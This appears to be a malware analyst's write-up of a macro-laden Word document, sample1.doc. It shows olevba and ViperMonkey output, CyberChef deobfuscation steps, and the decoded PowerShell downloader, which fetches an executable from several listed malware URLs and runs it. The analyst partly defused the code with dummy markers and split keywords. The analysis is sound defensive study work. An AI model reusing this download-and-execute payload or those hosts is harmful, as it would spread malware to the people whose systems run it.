# Analyze sample1.doc file

**Quick answers**

- What does it do?
    - It tries to downloads files from 3 different urls and - if successful - will executed it. It will try multiple times (925)
    - It is truyl malware as anything could be behind the exe files.
- What steps does it take to do it?
    1. Upon opening the word document (if macros enabled) some obfuscated code is run which ultimatly returns a string
    2. This string - which is obfuscated command line code - is dynamically executed using the Shell command
    3. The cmd script calls several urls using the .net webclient and tries to download an exe file which is saved to the filesystem and ultimatly executed
        - errors during the download are caught and swallowed
        - this all happens in a loos so it is tried multiple times (925)


## Steps

### Extract vb code and getting info using tools
- run olevba to get a quick overview and extract code
    -  `pipenv run olevba ./Sample1.doc` to extract vb code from doc file
    - Some info: 
        - runs automatically upon opening
        - is suspicious: might run an executable, various attempts to obfuscate detected
- run ViperMonkey
    - `./docker/dockermonkey.sh ~/reversing/Sample.doc` 
        - Deobfuscation did not work that well (or I did something wrong)
        - However, a shell command was extracted, which itself is obfuscated



### Further deobfuscation by hand
I copied the output of olevba into a text/vb file for further deobfuscation using visual studio code. (plus create a git repo so I can easily undo any changes)
    - making sure code is not accidentely executed (have syntax errors, outcomment some code)
    - rename functions
    - execute safe vb code (only string operations) in excel to get return string of a function, whose only purpose to return a string (I was a bit lazy)
    - realized that the the vb code basically just puts together a string which is then used to call the command line. That output I could also get from the ViperMonkey, so there is no need to further deobfuscate the vb code. 
    - however the command line code is obfuscated

` ######DUMMYTOPREVENTACCIDENTALEXECUTION###########   Cmd /V^:^oN /r  "^Se^T ^  ^   ######DUMMYTOPREVENTACCIDENTALEXECUTION###########^J^e^4=^A^AC^AgA^AI^A^A
######Code removed to a) shorten and b) prevent virus scanner from going berserk ###########
M^E^A^iB^Q^Z^AcFA^uA^AdA^UG^A^O^BA^IA^Q^HAjB^Q^Z^Ao^G^A^iB^wb^A^0CA^3B^QZA^4GA^9AQ^UA^QF^A6B^A^J^ ^e^-^ ^l^l^e^hsr^e^wo^p&    ^foR /^L  %^B ^IN  (  ^  9^25^  ^  ^-^1 ^ ^0)  D^O s^E^t   ^OQR^J=!^OQR^J!!^J^e^4:~ %^B, 1!&& I^f %^B  ^LEQ ^0 Ca^L^l  %^OQR^J:^*OQRJ^!^=%   "    `


### Deobfuscate the command line code
*Step one: remove "^" (Replace in cyberchef)*
```
SeT    ######DUMMYTOPREVENTACCIDENTALEXECUTION###########Je4=AACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAQfA0HA7BAaAMGA0BQYAMGA9BwOAsGAhBQZAIHAiBwOAsEAuBwdA######Code removed to a) shorten and b) prevent virus scanner from going berserk ###########bA8GAjBgLAAHA1BwbAIHAnBwaAMGAvBgcAEGAoBAcAwGAhBwLA8CA6AAcAQHA0BAaAcCA9AwaAoHAYBAJAsDA0BgbAUGApBAbAMEAiBQZAcFAuAAdAUGAOBAIAQHAjBQZAoGAiBwbA0CA3BQZA4GA9AQUAQFA6BAJ e- llehsrewop&    foR /L  %B IN  (    925    -1  0)  DO sEt   OQRJ=!OQRJ!!Je4:~ %B, 1!&& If %B  LEQ 0 CaLl  %OQRJ:*OQRJ!=%   
```

*Step 2: deobfuscate reversed base 64*
Cyberchef recipe (just the middle part starting with "AAC...BAJ"): 
```
[{"op":"Reverse","args":["Character"]},{"op":"From Base64","args":["A-Za-z0-9+/=",true,false]},{"op":"To Hex","args":["Space",0]},{"op":"Find / Replace","args":[{"option":"Simple string","string":"00"},"",true,false,true,false]},{"op":"From Hex","args":["Auto"]}]
```
Outcome full:
``` 
SeT    Je4=  ######DUMMYTOPREVENTACCIDENTALEXECUTION###########
$zTQ=new-object Net.WebClient;$Xzk='htt##ANTSCANNER##  p://alpharockgroup.com/HT@ht##ANTSCANNER##tp://adminflex.dk/l5TF6w@http://gailong.net/X5AyWfJG@http://shunji.org/logsite/TJaaB@ht##ANTSCANNER##tp://binar48.ru/OtTlVIU5'.Split('@');$YWz = '692';$wnK=$env:public+'\'+$YWz+'.exe';foreach($JKK in $Xzk){try{$zTQ.Down##ANTSCANNER##loadFile($JKK, $wnK);Inv##ANTSCANNER##oke-Item $wnK;break;}catch{}} 
 foR /L  %B IN  (    925    -1  0)  DO sEt   OQRJ=!OQRJ!!Je4:~ %B, 1!&& If %B  LEQ 0 CaLl  %OQRJ:*OQRJ!=%   
 ```

 Minor renames and formating (by hand)
 ``` 
SeT    Je4=  ######DUMMYTOPREVENTACCIDENTALEXECUTION###########
$webClient=new-object Net.WebCl##ANTSCANNER##ient;$urlArray='htt##ANTSCANNER##p://alpharockgroup.com/HT@http://adminflex.dk/l5TF6w@http://gailong.net/X5AyWfJG@ht##ANTSCANNER##tp://shunji.org/logsite/TJaaB@h##ANTSCANNER##ttp://binar48.ru/OtTlVIU5'.Split('@');$noSixNineTwo = '692';$filePath=$env:public+'\'+$noSixNineTwo+'.exe';foreach($url in $urlArray){try{$webClient.Do##ANTSCANNER##wnloadFile($url, $filePath);Inv##ANTSCANNER##oke-Item $filePath;break;}catch{}} 
 foR /L  %B IN  (    925    -1  0)  DO sEt   OQRJ=!OQRJ!!Je4:~ %B, 1!&& If %B  LEQ 0 CaLl  %OQRJ:*OQRJ!=%   
 ```